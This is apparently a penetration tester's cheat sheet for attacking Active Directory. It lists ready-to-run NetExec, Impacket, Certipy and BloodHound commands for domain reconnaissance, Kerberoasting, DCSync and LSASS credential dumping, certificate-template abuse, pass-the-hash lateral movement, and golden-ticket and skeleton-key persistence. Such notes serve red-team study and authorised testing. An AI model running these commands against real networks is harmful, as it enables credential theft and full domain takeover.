# Active Directory Methodology

## Recon
- `nxc smb 10.0.0.0/24 --gen-relay-list relay.txt`
- `bloodhound-python -d corp.local -u user -p pass -ns DC --collect All`
- LDAP: `ldapsearch -x -H ldap://dc -b 'DC=corp,DC=local'`

## Credential access
- AS-REP roasting: `impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt`
- Kerberoasting: `impacket-GetUserSPNs corp.local/user:pass -request`
- DCSync (with replication rights): `impacket-secretsdump corp.local/admin@dc`
- LSASS via `nxc smb -M lsassy` after SMB auth

## ADCS abuse
- ESC1: enrollee-supplies-subject SAN abuse via `certipy req`
- ESC4: GenericWrite on template → modify EKU
- ESC8: NTLM relay to Web Enrollment via PetitPotam/Coercer
- Validate with `certipy find -u user -p pass -dc-ip DC`

## Lateral movement
- Pass-the-hash: `nxc smb hosts -u admin -H NTLM_HASH`
- Pass-the-ticket: `export KRB5CCNAME=...; nxc smb -k`
- Overpass-the-hash: `getTGT.py corp.local/user -hashes :NTLM`
- WinRM, MSSQL, RDP via `nxc winrm/mssql/rdp`

## Persistence
- Golden ticket (krbtgt hash), silver ticket (service account hash)
- Skeleton key (Mimikatz)
- DCShadow

## Tools
- BloodHound, Impacket suite, NetExec (nxc)/CrackMapExec, Certipy, Mimikatz, Rubeus
